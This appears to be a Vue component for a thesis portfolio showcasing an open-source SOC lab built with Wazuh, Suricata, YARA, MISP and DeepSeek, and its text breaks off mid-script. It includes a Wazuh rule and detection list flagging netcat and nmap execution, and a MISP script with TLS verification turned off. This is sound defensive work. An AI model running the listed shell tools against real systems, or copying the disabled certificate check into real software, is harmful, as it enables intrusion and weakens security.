<template>
  <div class="soc-timeline-wrapper" ref="wrapperEl">

    <!-- ══════════════════════════════════════════════
         HEADER — Titre hero du projet mémoire
    ════════════════════════════════════════════════ -->
    <div class="soc-hero-header">
      <span class="soc-hero-badge">
        <ShieldCheck :size="14" />
        Réalisation à la une
      </span>
      <h2 class="soc-hero-title">
        SOC Open-Source :<br />
        <span class="soc-hero-title--accent">Incident Response Evolution</span>
      </h2>
      <p class="soc-hero-desc">
        Conception, déploiement et validation d'un Centre d'Opérations de Sécurité (SOC) complet
        pour l'entreprise <strong>PANESS IT</strong>, fondé exclusivement sur des technologies open‑source et
        validé par 4 scénarios d'attaque réels. Mémoire de fin de cycle — Samnick Biga Raoul Aubin (IHTM).
      </p>
      <div class="soc-hero-pills">
        <span class="soc-pill pill--orange">Wazuh v4.14.5</span>
        <span class="soc-pill pill--red">Suricata NIDS</span>
        <span class="soc-pill pill--purple">YARA v4.5.1</span>
        <span class="soc-pill pill--blue">DeepSeek AI</span>
        <span class="soc-pill pill--indigo">MISP &amp; DFIR‑IRIS</span>
        <span class="soc-pill pill--green">Shuffle SOAR</span>
        <span class="soc-pill pill--teal">Telegram Bot</span>
      </div>
    </div>

    <!-- ══════════════════════════════════════════════
         ONGLETS DE NAVIGATION INTERACTIFS
    ════════════════════════════════════════════════ -->
    <div class="soc-tab-nav" role="tablist" aria-label="Sections du projet SOC">
      <button
        class="soc-tab-btn"
        :class="{ 'soc-tab-btn--active': activeTab === 'phases' }"
        type="button"
        role="tab"
        :aria-selected="activeTab === 'phases'"
        @click="activeTab = 'phases'"
      >
        <Layers :size="16" />
        <span>9 Phases de Déploiement</span>
      </button>
      <button
        class="soc-tab-btn"
        :class="{ 'soc-tab-btn--active': activeTab === 'scenarios' }"
        type="button"
        role="tab"
        :aria-selected="activeTab === 'scenarios'"
        @click="activeTab = 'scenarios'"
      >
        <ShieldAlert :size="16" />
        <span>4 Scénarios d'Attaque (Tests Réels)</span>
        <span class="soc-tab-count">4 Validés</span>
      </button>
      <button
        class="soc-tab-btn"
        :class="{ 'soc-tab-btn--active': activeTab === 'topology' }"
        type="button"
        role="tab"
        :aria-selected="activeTab === 'topology'"
        @click="activeTab = 'topology'"
      >
        <Server :size="16" />
        <span>Topologie Lab (5 VMs NAT)</span>
      </button>
    </div>

    <!-- ══════════════════════════════════════════════
         TERMINAL BAR — Ligne commande défilante
    ════════════════════════════════════════════════ -->
    <div class="soc-terminal-bar" aria-hidden="true">
      <span class="term-prompt">root@soc-lab:~#</span>
      <span class="term-cmd" ref="termCmdEl">{{ activeTab === 'scenarios' ? 'attack_simulation --mitre --scenarios=4 --status=validated' : activeTab === 'topology' ? 'netstat -tulpn --virtualbox --vms=5' : 'incident_response --timeline --verbose --phases=9' }}</span>
      <span class="term-cursor">▋</span>
    </div>

    <!-- ══════════════════════════════════════════════
         VUE 1 : TIMELINE VERTICALE (9 PHASES)
    ════════════════════════════════════════════════ -->
    <div v-show="activeTab === 'phases'" class="soc-timeline-track" role="list">
      <!-- Ligne verticale centrale -->
      <div class="soc-center-line" aria-hidden="true">
        <div class="soc-center-line__fill" :style="{ height: lineProgress + '%', background: lineColor, boxShadow: '0 0 12px ' + lineColor + '80' }"></div>
      </div>

      <!-- ITEMS ALTERNANT GAUCHE / DROITE -->
      <div
        v-for="(phase, idx) in phases"
        :key="phase.id"
        class="soc-phase-row"
        :class="[
          idx % 2 === 0 ? 'phase-row--left' : 'phase-row--right',
          { 'phase-row--visible': visiblePhaseIndices.includes(idx) },
          `phase-row--${phase.severity}`,
        ]"
        :data-phase-idx="idx"
        role="listitem"
      >
        <!-- Côté vide (espace) -->
        <div class="soc-phase-side soc-phase-side--empty" aria-hidden="true"></div>

        <!-- Marqueur central cliquable -->
        <div class="soc-phase-center">
          <button
            class="soc-phase-marker"
            :class="`soc-phase-marker--${phase.severity}`"
            type="button"
            :aria-label="`Voir les détails de la phase ${phase.number} : ${phase.title}`"
            @click="openModal(phase)"
          >
            <component :is="phase.icon" :size="18" />
          </button>
          <span
            class="soc-phase-number"
            :class="idx % 2 === 0 ? 'soc-phase-number--left' : 'soc-phase-number--right'"
          >{{ String(idx + 1).padStart(2, '0') }}</span>
        </div>

        <!-- Carte du contenu -->
        <div class="soc-phase-side soc-phase-side--content">
          <article class="soc-phase-card glass-card">
            <!-- Badge criticité + Tool tag -->
            <div class="soc-phase-card__meta">
              <span class="severity-badge" :class="`severity-badge--${phase.severity}`">
                <component :is="severityIcon(phase.severity)" :size="11" />
                {{ severityLabel(phase.severity) }}
              </span>
              <span class="tool-tag" v-if="phase.tool">{{ phase.tool }}</span>
            </div>

            <h3 class="soc-phase-card__title">{{ phase.title }}</h3>
            <p class="soc-phase-card__body">{{ phase.body }}</p>

            <!-- Capture d'écran / visuel de la phase -->
            <button
              v-if="phase.image"
              class="soc-phase-img-btn"
              type="button"
              :aria-label="`Agrandir la capture : ${phase.title}`"
              @click.stop="$emit('open-lightbox', [phase.image], 0, phase.title)"
            >
              <img
                :src="phase.image"
                :alt="phase.imageAlt || phase.title"
                class="soc-phase-img"
                loading="lazy"
              />
              <span class="soc-phase-img__overlay" aria-hidden="true">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 3h6v6M9 21H3v-6M21 3l-7 7M3 21l7-7"/></svg>
                Agrandir
              </span>
            </button>

            <!-- Terminal output box -->
            <div v-if="phase.snippet" class="soc-term-box">
              <div class="soc-term-box__bar" aria-hidden="true">
                <span class="dot dot--red"></span>
                <span class="dot dot--yellow"></span>
                <span class="dot dot--green"></span>
                <span class="soc-term-box__label">{{ phase.snippetLabel || 'console output' }}</span>
              </div>
              <pre class="soc-term-box__code"><code>{{ phase.snippet }}</code></pre>
            </div>

            <!-- Bouton modal logs / playbooks -->
            <button class="soc-detail-btn" type="button" @click="openModal(phase)">
              <FileText :size="13" />
              Voir les logs et playbooks
            </button>
          </article>
        </div>
      </div>
    </div>

    <!-- ══════════════════════════════════════════════
         VUE 2 : 4 SCÉNARIOS D'ATTAQUE (TESTS RÉELS)
    ══════════════════════════════════════════════ -->
    <div v-show="activeTab === 'scenarios'" class="soc-scenarios-view">
      <div class="soc-scenarios-intro">
        <h3 class="soc-scenarios-title">
          <ShieldAlert :size="22" style="color: #ff6b35;" />
          4 Scénarios d'Attaque &amp; Réponse Automatisée (Validés)
        </h3>
        <p class="soc-scenarios-desc">
          Validation pratique du SOC sous VirtualBox NAT. Chaque scénario simule une attaque réaliste (Red Team Kali Linux) contre les endpoints et démontre la chaîne complète : détection, corrélation, réponse active et enrichissement IA.
        </p>
      </div>

      <div class="soc-scenarios-grid">
        <article
          v-for="sc in scenarios"
          :key="sc.id"
          class="soc-scenario-card glass-card"
          :class="`soc-scenario-card--${sc.severity}`"
        >
          <!-- Entête scénario -->
          <div class="soc-sc-header">
            <div class="soc-sc-tags">
              <span class="soc-sc-number">SCÉNARIO {{ sc.number }}</span>
              <span class="severity-badge" :class="`severity-badge--${sc.severity}`">
                <component :is="severityIcon(sc.severity)" :size="11" />
                {{ severityLabel(sc.severity) }}
              </span>
              <span class="mitre-tag">MITRE {{ sc.mitre }}</span>
            </div>
            <span class="soc-sc-status">
              <CheckCircle :size="14" />
              {{ sc.status }}
            </span>
          </div>

          <h4 class="soc-sc-title">{{ sc.title }}</h4>
          <p class="soc-sc-desc">{{ sc.shortDesc }}</p>

          <!-- Détails cibles & vecteurs -->
          <div class="soc-sc-meta-grid">
            <div class="soc-sc-meta-item">
              <span class="soc-sc-meta-label">Attaquant :</span>
              <span class="soc-sc-meta-val code-text">{{ sc.attacker }}</span>
            </div>
            <div class="soc-sc-meta-item">
              <span class="soc-sc-meta-label">Cible(s) :</span>
              <span class="soc-sc-meta-val code-text">{{ sc.target }}</span>
            </div>
            <div class="soc-sc-meta-item full-width">
              <span class="soc-sc-meta-label">Vecteur d'attaque :</span>
              <span class="soc-sc-meta-val">{{ sc.vector }}</span>
            </div>
            <div class="soc-sc-meta-item full-width">
              <span class="soc-sc-meta-label">Détection &amp; Déclencheur :</span>
              <span class="soc-sc-meta-val">{{ sc.detection }}</span>
            </div>
            <div class="soc-sc-meta-item full-width">
              <span class="soc-sc-meta-label">Réponse Automatisée :</span>
              <span class="soc-sc-meta-val highlight-val">{{ sc.response }}</span>
            </div>
          </div>

          <!-- Capture d'écran scénario -->
          <button
            v-if="sc.image"
            class="soc-phase-img-btn"
            type="button"
            :aria-label="`Agrandir la preuve : ${sc.title}`"
            @click.stop="$emit('open-lightbox', [sc.image], 0, sc.title)"
          >
            <img
              :src="sc.image"
              :alt="sc.imageAlt || sc.title"
              class="soc-phase-img"
              loading="lazy"
            />
            <span class="soc-phase-img__overlay" aria-hidden="true">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 3h6v6M9 21H3v-6M21 3l-7 7M3 21l7-7"/></svg>
              Voir la preuve de validation
            </span>
          </button>

          <!-- Terminal output box -->
          <div v-if="sc.snippet" class="soc-term-box">
            <div class="soc-term-box__bar" aria-hidden="true">
              <span class="dot dot--red"></span>
              <span class="dot dot--yellow"></span>
              <span class="dot dot--green"></span>
              <span class="soc-term-box__label">{{ sc.snippetLabel || 'preuve d\'exécution' }}</span>
            </div>
            <pre class="soc-term-box__code"><code>{{ sc.snippet }}</code></pre>
          </div>

          <!-- Bouton modal playbook -->
          <button class="soc-detail-btn" type="button" @click="openModal(sc)">
            <FileText :size="13" />
            Voir les commandes Kali, règles Wazuh &amp; Playbooks
          </button>
        </article>
      </div>
    </div>

    <!-- ══════════════════════════════════════════════
         VUE 3 : TOPOLOGIE DU LABORATOIRE (5 VMs)
    ══════════════════════════════════════════════ -->
    <div v-show="activeTab === 'topology'" class="soc-topology-view">
      <div class="soc-scenarios-intro">
        <h3 class="soc-scenarios-title">
          <Server :size="22" style="color: #ff6b35;" />
          Topologie Réseau &amp; Infrastructure (5 Machines Virtuelles)
        </h3>
        <p class="soc-scenarios-desc">
          Réseau virtuel isolé NAT <code>192.168.100.0/24</code> sur Oracle VirtualBox 7.0 simulant l'infrastructure d'entreprise PANESS IT avec séparation des rôles SIEM, services SOAR, endpoints de production et poste d'attaque Kali Linux.
        </p>
      </div>

      <!-- Aperçu diagramme -->
      <div class="soc-topo-diagram-card glass-card">
        <div class="soc-topo-diagram-header">
          <span class="soc-hero-badge"><Network :size="14" /> Architecture Lab NAT (192.168.100.0/24)</span>
          <button
            class="soc-detail-btn"
            type="button"
            @click.stop="$emit('open-lightbox', ['/soc/soc-architecture.jpg'], 0, 'Architecture Réseau Lab 5 VMs')"
          >
            <ExternalLink :size="14" />
            Agrandir le diagramme
          </button>
        </div>
        <img
          src="/soc/soc-architecture.jpg"
          alt="Diagramme VirtualBox NAT 5 VMs"
          class="soc-topo-diagram-img"
          @click.stop="$emit('open-lightbox', ['/soc/soc-architecture.jpg'], 0, 'Architecture Réseau Lab 5 VMs')"
        />
      </div>

      <!-- Grille des 5 VMs -->
      <div class="soc-vms-grid">
        <div
          v-for="vm in topologyVms"
          :key="vm.name"
          class="soc-vm-card glass-card"
          :style="{ '--vm-accent': vm.color }"
        >
          <div class="soc-vm-header">
            <div>
              <span class="soc-vm-badge" :style="{ color: vm.color, borderColor: vm.color + '50', background: vm.color + '20' }">
                {{ vm.status }}
              </span>
              <h4 class="soc-vm-name">{{ vm.name }}</h4>
            </div>
            <span class="soc-vm-ip">{{ vm.ip }}</span>
          </div>

          <div class="soc-vm-meta">
            <span class="soc-vm-os"><strong>OS :</strong> {{ vm.os }}</span>
            <span class="soc-vm-role"><strong>Rôle :</strong> {{ vm.role }}</span>
          </div>

          <div class="soc-vm-services">
            <span class="soc-vm-services-title">Services &amp; Ports :</span>
            <ul>
              <li v-for="srv in vm.services" :key="srv">{{ srv }}</li>
            </ul>
          </div>
        </div>
      </div>
    </div>

    <!-- ══════════════════════════════════════════════
         BANDE RÉSULTATS — Métriques du mémoire
    ════════════════════════════════════════════════ -->
    <div class="soc-results-band">
      <div v-for="kpi in kpis" :key="kpi.label" class="soc-kpi">
        <span class="soc-kpi__value">{{ kpi.value }}</span>
        <span class="soc-kpi__label">{{ kpi.label }}</span>
      </div>
    </div>

    <!-- ══════════════════════════════════════════════
         BOUTON PDF — Consultation mémoire
    ════════════════════════════════════════════════ -->
    <div class="soc-footer-cta" v-if="pdfUrl">
      <a :href="pdfUrl" target="_blank" rel="noreferrer" class="button primary soc-pdf-btn">
        <FileText :size="17" />
        Consulter le mémoire complet (PDF)
      </a>
    </div>

    <!-- ══════════════════════════════════════════════
         MODALE DÉTAIL — Logs / Playbooks / Règles
    ════════════════════════════════════════════════ -->
    <Teleport to="body">
      <Transition name="soc-modal-fade">
        <div
          v-if="activePhase"
          class="soc-modal-backdrop"
          role="presentation"
          @click.self="closeModal"
        >
          <div class="soc-modal glass-card" role="dialog" aria-modal="true" :aria-labelledby="`modal-title-${activePhase.id}`">
            <div class="soc-modal__header">
              <div>
                <span class="severity-badge" :class="`severity-badge--${activePhase.severity}`">
                  <component :is="severityIcon(activePhase.severity)" :size="12" />
                  {{ severityLabel(activePhase.severity) }}
                </span>
                <span class="soc-modal__tool" v-if="activePhase.tool">{{ activePhase.tool }}</span>
              </div>
              <button class="soc-modal__close" type="button" @click="closeModal" aria-label="Fermer">
                <X :size="20" />
              </button>
            </div>

            <h3 :id="`modal-title-${activePhase.id}`" class="soc-modal__title">{{ activePhase.title }}</h3>
            <p class="soc-modal__desc">{{ activePhase.body }}</p>

            <!-- Logs / Règles / Playbook dans terminal -->
            <div class="soc-term-box">
              <div class="soc-term-box__bar" aria-hidden="true">
                <span class="dot dot--red"></span>
                <span class="dot dot--yellow"></span>
                <span class="dot dot--green"></span>
                <span class="soc-term-box__label">{{ activePhase.modalLabel || 'logs / playbook / règles' }}</span>
              </div>
              <pre class="soc-term-box__code soc-term-box__code--modal"><code>{{ activePhase.playbook }}</code></pre>
            </div>

            <!-- Détails technique supplémentaires -->
            <div v-if="activePhase.details?.length" class="soc-modal__details">
              <h4>Points techniques clés</h4>
              <ul>
                <li v-for="d in activePhase.details" :key="d">{{ d }}</li>
              </ul>
            </div>
          </div>
        </div>
      </Transition>
    </Teleport>
  </div>
</template>

<script setup>
import { ref, computed, onMounted, onBeforeUnmount } from 'vue';
import {
  ShieldCheck,
  ShieldAlert,
  AlertTriangle,
  Info,
  Server,
  Radio,
  Cpu,
  Zap,
  Send,
  Database,
  Terminal,
  FileText,
  CheckCircle,
  X,
  Bug,
  Network,
  HardDrive,
  Layers,
  ExternalLink,
} from 'lucide-vue-next';

defineProps({
  pdfUrl: { type: String, default: '' },
});

const activeTab = ref('phases'); // 'phases' | 'scenarios' | 'topology'
const wrapperEl = ref(null);
const termCmdEl = ref(null);
const activePhase = ref(null);
const visiblePhaseIndices = ref([0, 1, 2, 3, 4, 5, 6, 7, 8]);
const lineProgress = ref(100);

// Couleur de la ligne selon la sévérité de la phase courante (dernière visible)
const SEVERITY_COLORS = {
  info:     '#38bdf8',
  high:     '#e95420',
  critical: '#ef4444',
  medium:   '#c084fc',
};
const lineColor = computed(() => {
  if (visiblePhaseIndices.value.length === 0) return SEVERITY_COLORS.info;
  const maxIdx = Math.max(...visiblePhaseIndices.value);
  const phase  = phases[maxIdx];
  return SEVERITY_COLORS[phase?.severity] ?? SEVERITY_COLORS.info;
});

// ──────────────────────────────────────────────
// KPIs du mémoire
// ──────────────────────────────────────────────
const kpis = [
  { value: '9', label: 'Phases de déploiement' },
  { value: '5', label: 'VMs VirtualBox NAT' },
  { value: '4', label: 'Scénarios d\'attaque validés' },
  { value: '< 3s', label: 'Temps de réponse aux incidents' },
  { value: '0 FCFA', label: 'Coût licences logicielles' },
  { value: '7', label: 'Outils SOC intégrés' },
];

// ──────────────────────────────────────────────
// Helpers sévérité
// ──────────────────────────────────────────────
function severityLabel(s) {
  return { critical: 'CRITICAL', high: 'HIGH', medium: 'MEDIUM', info: 'INFO' }[s] || 'INFO';
}
function severityIcon(s) {
  return { critical: ShieldAlert, high: AlertTriangle, medium: Info, info: Info }[s] || Info;
}

// ──────────────────────────────────────────────
// PHASES DU MÉMOIRE (ordre chronologique exact)
// ──────────────────────────────────────────────
const phases = [
  {
    id: 'contexte',
    title: 'Contexte & Présentation du Projet',
    tool: 'PANESS IT',
    icon: Info,
    severity: 'info',
    image: '/soc/soc-architecture.jpg',
    imageAlt: 'Architecture VirtualBox NAT — 5 VMs SOC-Network PANESS IT',
    snippetLabel: 'objectif du mémoire',
    body: 'Architecture complète d\'un centre d\'opérations de sécurité (SOC) fondé exclusivement sur des outils open‑source, conçue, déployée et validée en environnement virtualisé pour l\'entreprise PANESS IT (PME informatique de Yaoundé). Mémoire de Licence Professionnelle RSI — IHTM.',
    snippet: `Architecture SOC Open-Source — PANESS IT (2026)
Infrastructure : VirtualBox NAT 192.168.100.0/24
Auteur        : Samnick Biga Raoul Aubin
Encadreur pro : M. Awouafack Fabien (PANESS)
Encadreur acad: M. Teka Wilfried (IHTM)
Objectif      : SOC/SIEM/EDR complet 0 FCFA de licences`,
    playbook: `# Architecture VirtualBox NAT — 5 Machines Virtuelles
wazuh-server  : Amazon Linux 2023 (OVA)  — 192.168.100.10
soc-services  : Ubuntu 24.04 (Docker)    — 192.168.100.20
agent-linux   : Debian 12               — 192.168.100.30
agent-windows : Windows 10 Pro          — 192.168.100.40
kali-attacker : Kali Linux              — 192.168.100.50

Réseau NAT dédié: SOC-Network (192.168.100.0/24)
Hyperviseur: Oracle VirtualBox 7.0`,
    modalLabel: 'Architecture du laboratoire',
    details: [
      'Réseau NAT isolé VirtualBox (SOC-Network) simulant un environnement d\'entreprise réel',
      'Conformité MITRE ATT&CK pour la cartographie des attaques testées',
      'Approche défensive bleue (Blue Team) avec simulation rouge (Red Team) via Kali Linux',
      'Stack entièrement open-source : Wazuh, Suricata, MISP, IRIS, Shuffle, YARA, DeepSeek',
    ],
  },
  {
    id: 'infra-wazuh',
    title: 'Phase 1 — Installation Infrastructure Wazuh',
    tool: 'Wazuh v4.14.5',
    icon: Server,
    severity: 'info',
    image: '/soc/wazuh-dashboard.jpg',
    imageAlt: 'Wazuh SIEM Dashboard — alertes de sécurité en temps réel',
    snippetLabel: '/var/ossec/etc/ossec.conf',
    body: 'Déploiement du serveur Wazuh (SIEM central) via l\'OVA officielle sur Amazon Linux 2023. Configuration du Manager avec OpenSearch intégré, du Wazuh Dashboard (:443) et paramétrage des seuils d\'alertes. Point d\'entrée unique pour la corrélation de tous les événements de sécurité.',
    snippet: `[root@wazuh-server ~]# systemctl status wazuh-manager
● wazuh-manager.service — Wazuh Manager
   Loaded: loaded (/lib/systemd/system/wazuh-manager.service)
   Active: active (running) since 2026-06-10T08:00:00
[INFO] Wazuh Manager v4.14.5 — Running
[INFO] OpenSearch Dashboard accessible sur :443`,
    playbook: `# Configuration ossec.conf (extrait)
<ossec_config>
  <global>
    <jsonout_output>yes</jsonout_output>
    <alerts_log>yes</alerts_log>
    <logall>no</logall>
    <email_notification>no</email_notification>
    <smtp_server>localhost</smtp_server>
    <email_from>wazuh@paness.local</email_from>
  </global>
  <alerts>
    <log_alert_level>3</log_alert_level>
    <email_alert_level>12</email_alert_level>
  </alerts>
  <remote>
    <connection>secure</connection>
    <port>1514</port>
    <protocol>tcp</protocol>
  </remote>
</ossec_config>`,
    modalLabel: 'ossec.conf — Configuration Wazuh Manager',
    details: [
      'OVA Wazuh 4.14.5 importée sur VirtualBox — Amazon Linux 2023 préconfigurée',
      'OpenSearch Dashboard accessible via HTTPS (:443) pour la visualisation des alertes',
      'Port 1514 (TCP) pour la communication sécurisée Agents ↔ Manager',
      'Seuil d\'alerte email configuré à niveau 12 pour les incidents critiques',
    ],
  },
  {
    id: 'agents',
    title: 'Phase 2 — Déploiement des Agents Wazuh',
    tool: 'Wazuh Agent',
    icon: HardDrive,
    severity: 'info',
    snippetLabel: 'agent enrollment output',
    body: 'Installation et enregistrement des agents Wazuh sur les endpoints (Debian 12 et Windows 10 Pro). Configuration du canal chiffré entre chaque agent et le Manager central. Vérification de la remontée des logs système, sécurité et applications en temps réel vers le SIEM.',
    snippet: `[agent-linux] Wazuh Agent enrollment...
[INFO] Agent ID: 001 — Name: agent-linux
[INFO] Connected to Manager 192.168.100.10:1514
[OK] Logs syslog, auth.log — actifs

[agent-windows] Agent enrollment...
[INFO] Agent ID: 002 — Name: agent-windows
[INFO] Windows Event Channel collecté
[OK] Security, System, Application — actifs`,
    playbook: `# Enregistrement agent Linux (Debian 12)
# 1. Installation
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --dearmor | sudo tee /usr/share/keyrings/wazuh.gpg > /dev/null
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee /etc/apt/sources.list.d/wazuh.list
sudo apt-get install wazuh-agent

# 2. Configuration
WAZUH_MANAGER="192.168.100.10" WAZUH_AGENT_NAME="agent-linux" dpkg -i wazuh-agent_4.14.5-1_amd64.deb

# 3. Activation
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent`,
    modalLabel: 'agent enrollment — ossec-authd',
    details: [
      'Agent Wazuh installé sur Debian 12 (agent-linux) et Windows 10 Pro (agent-windows)',
      'Canal chiffré TLS entre agents et Manager via port 1514 TCP',
      'Collecte automatique : auth.log, syslog, Windows Security Event Log',
      'Agent ID assigné automatiquement par le Manager lors de l\'enrollment',
    ],
  },
  {
    id: 'suricata',
    title: 'Phase 3 — Intégration Suricata NIDS',
    tool: 'Suricata 7.x',
    icon: Radio,
    severity: 'high',
    snippetLabel: '/var/log/suricata/eve.json',
    body: 'Déploiement de Suricata en mode NIDS (Network Intrusion Detection System) sur l\'interface eth2 du wazuh-server pour surveiller le trafic réseau de tout le sous-réseau SOC-Network. Téléchargement et activation des règles Emerging Threats Open. Intégration avec Wazuh via Filebeat pour la corrélation des alertes réseau.',
    snippet: `[ALERT] ET SCAN Potential SSH Scan OUTBOUND
Src IP: 192.168.100.50 (kali-attacker)
Dst IP: 192.168.100.30:22 (agent-linux)
Signature: 2001219 — Nmap SYN Scan Detection
[WAZUH] Rule 86601 triggered — Level 8`,
    playbook: `# Configuration suricata.yaml (extrait)
vars:
  address-groups:
    HOME_NET: "[192.168.100.0/24]"
    EXTERNAL_NET: "!$HOME_NET"

af-packet:
  - interface: eth2
    cluster-id: 99
    cluster-type: cluster_flow
    defrag: yes

rule-files:
  - /var/lib/suricata/rules/suricata.rules

outputs:
  - eve-log:
      enabled: yes
      filetype: regular
      filename: eve.json
      types: [alert, dns, http, tls]`,
    modalLabel: 'suricata.yaml + Emerging Threats rules',
    details: [
      'Suricata déployé en mode NIDS sur eth2 (interface interne SOC-Network)',
      'Règles Emerging Threats Open (ET/Open) mises à jour automatiquement via suricata-update',
      'Journal eve.json lu par l\'agent Wazuh via Filebeat → corrélation SIEM',
      'Détection : scans Nmap, attaques SSH, exfiltration DNS, anomalies TCP/UDP',
    ],
  },
  {
    id: 'fim-auditd',
    title: 'Phase 4 — FIM, Auditd & Sysmon (Surveillance Endpoints)',
    tool: 'FIM / Auditd / Sysmon',
    icon: Terminal,
    severity: 'critical',
    snippetLabel: 'Auditd + CDB suspicious-programs',
    body: 'File Integrity Monitoring (FIM) Wazuh surveillant les répertoires critiques (/home, /etc, /tmp) en temps réel. Auditd sous Linux (syscall execve) et Sysmon sous Windows (EventID 1) journalisant les exécutions de processus. Comparaison instantanée avec la liste CDB suspicious-programs pour bloquer les binaires dangereux.',
    snippet: `[AUDITD] execve() syscall captured:
comm="nc" (netcat) — pid=4823
[CDB] Match 'nc:red' in suspicious-programs
[RULE 100210] ALERT Level 12 fired !
  Desc: Commande suspecte détectée (nc)
  MITRE: T1059 — Command & Scripting Interpreter`,
    playbook: `<!-- local_rules.xml — Règle personnalisée CDB -->
<group name="auditd,sysmon,custom,">

  <!-- Règle 100210 : Commande suspecte via CDB -->
  <rule id="100210" level="12">
    <if_sid>80700</if_sid>
    <list field="audit.command" lookup="match_key">
      etc/lists/suspicious-programs
    </list>
    <description>
      Auditd: Commande suspecte via CDB: $(audit.command)
    </description>
    <mitre>
      <id>T1059</id>
    </mitre>
    <group>gdpr_IV_35.7.d,pci_dss_10.6.1,</group>
  </rule>

</group>

# Liste CDB /var/ossec/etc/lists/suspicious-programs
nc:red
ncat:red
netcat:red
nmap:red
tcpdump:yellow
wireshark:yellow`,
    modalLabel: 'local_rules.xml + CDB suspicious-programs',
    details: [
      'FIM Wazuh surveille /home, /etc/passwd, /etc/shadow, /tmp — modifications en temps réel',
      'Auditd capture les syscalls execve() sur agent-linux avec décodeur personnalisé',
      'Sysmon EventID 1 (Process Create) collecté sur agent-windows via Windows Event Channel',
      'Liste CDB suspicious-programs : nc, ncat, netcat, nmap, tcpdump, etc.',
    ],
  },
  {
    id: 'yara-fim',
    title: 'Phase 5 — YARA Active Response (Anti-Malware)',
    image: '/soc/yara-terminal.jpg',
    imageAlt: 'Terminal YARA — détection et suppression automatique malware (EICAR)',
    tool: 'YARA v4.5.1 + Valhalla',
    icon: Bug,
    severity: 'critical',
    snippetLabel: '/var/ossec/logs/active-responses.log',
    body: 'Déploiement de YARA v4.5.1 avec les règles Valhalla en Active Response Wazuh. Lors de toute modification détectée par FIM, le script yara.sh est déclenché automatiquement pour scanner le fichier créé. En cas de correspondance (ex. fichier EICAR), le script remove-threat.sh supprime le fichier malveillant en moins de 3 secondes.',
    snippet: `[FIM] New file detected: /home/raoulbiga/eicar_final6.txt
[AR] Triggering yara.sh on /home/raoulbiga/eicar_final6.txt
[YARA] Scanning with Valhalla rules...
[MATCH] EICAR_TEST_FILE — Signature: eicar_test
[INFO] Malware successfully deleted by remove-threat.sh
[WAZUH] Rule 108001 — Level 15 — YARA Alert fired`,
    playbook: `#!/bin/bash
# /var/ossec/active-response/bin/yara.sh (extrait)
YARA_PATH="/usr/local/bin/yara"
YARA_RULES="/var/ossec/active-response/yara/rules/yara_rules.yar"
FILENAME=$(echo $1 | cut -d'|' -f9)

# Scan YARA
YARA_OUTPUT=$("$YARA_PATH" -w -r -m "$YARA_RULES" "$FILENAME")

if [ -n "$YARA_OUTPUT" ]; then
  LOG="/var/ossec/logs/active-responses.log"
  echo "wazuh-YARA: INFO - Match: $YARA_OUTPUT" >> $LOG
  /var/ossec/active-response/bin/remove-threat.sh "$FILENAME"
fi

# Règle Wazuh (local_rules.xml)
# <rule id="108001" level="15">
#   <field name="yara_rule">.*</field>
#   <description>YARA: Malware détecté — $(yara_rule)</description>
# </rule>`,
    modalLabel: 'yara.sh + remove-threat.sh + règle 108001',
    details: [
      'YARA v4.5.1 compilé manuellement sur agent-linux et agent-windows (yara64.exe)',
      'Règles Valhalla couvrant plus de 20 000 signatures de malwares actifs',
      'Temps de réponse mesuré : < 3 secondes (FIM détection → suppression automatique)',
      'Test de validation : fichier EICAR (eicar_final6.txt) — détecté et supprimé avec succès',
    ],
  },
  {
    id: 'misp',
    title: 'Phase 6 — MISP Threat Intelligence',
    tool: 'MISP :1443',
    icon: Database,
    severity: 'high',
    snippetLabel: 'custom-misp.py — IOC correlation',
    body: 'Déploiement de MISP (Malware Information Sharing Platform) dans un conteneur Docker sur soc-services. Intégration via le script custom-misp.py qui interroge l\'API MISP pour corréler en temps réel les adresses IP suspectes détectées par Wazuh avec les flux de Threat Intelligence partagés.',
    snippet: `[WAZUH] Rule 5710: SSH Auth Failure x12
  Src IP: 192.168.100.50 (kali-attacker)
[MISP] custom-misp.py querying MISP API...
[MISP] GET /attributes/restSearch?value=192.168.100.50
[RESULT] IP flagged in malicious adversary campaign
[ALERT] IOC match confirmed — Escalating to IRIS`,
    playbook: `# /var/ossec/integrations/custom-misp.py (extrait)
import requests, json, sys

MISP_URL = "https://192.168.100.20:1443"
MISP_KEY  = "VOTRE-CLE-API-MISP"

def check_misp_ioc(ioc_value, ioc_type="ip-dst"):
    headers = {
        "Authorization": MISP_KEY,
        "Accept": "application/json",
        "Content-Type": "application/json"
    }
    payload = {
        "returnFormat": "json",
        "value": ioc_value,
        "type": ioc_type,
        "to_ids": 1
    }
    r = requests.post(
        f"{MISP_URL}/attributes/restSearch",
        headers=headers,
        json=payload,
        verify=False
    )
    attributes = r.json().get("response", {}).get("Attribute", [])
    return len(attributes) > 0`,
    modalLabel: 'custom-misp.py — MISP REST API',
    details: [
      'MISP déployé en Docker sur soc-services (:1443) avec base d\'IOCs pré-chargée',
      'Intégration native avec Wazuh via le répertoire /var/ossec/integrations/',
      'Corrélation automatique : IP suspectes brute-force SSH → vérification dans MISP',
      'Résultat : IP kali-attacker marquée dans un campaign d\'adversaire malveillant',
    ],
  },
  {
    id: 'deepseek',
    title: 'Phase 7 — Enrichissement IA avec DeepSeek',
    tool: 'DeepSeek AI API',
    icon: Cpu,
    severity: 'high',
    snippetLabel: 'custom-deepseek.py — LLM enrichissement',
    body: 'Intégration de l\'IA DeepSeek (LLM) pour enrichir automatiquement chaque alerte critique avec une explication en langage naturel : impact potentiel de la menace, contexte du vecteur d\'attaque et mesures de remédiation immédiates. Orchestré via le script custom-deepseek.py déclenché par Wazuh sur les alertes de niveau ≥ 10.',
    snippet: `[DEEPSEEK] Query: "Quel est l'impact de YARA rule: EICAR_TEST_FILE ?"
[RESPONSE] "Le fichier EICAR est un test standard simulant
une charge virale. Risque immédiat nul, mais sa présence
indique un test de sécurité ou une tentative d'intrusion.
Remédiation: Supprimer le fichier, vérifier l'origine."
[ENRICHMENT] Saved to alert context — Forwarded to IRIS`,
    playbook: `# /var/ossec/integrations/custom-deepseek.py (extrait)
import requests, json, sys

DEEPSEEK_URL = "https://api.deepseek.com/v1/chat/completions"
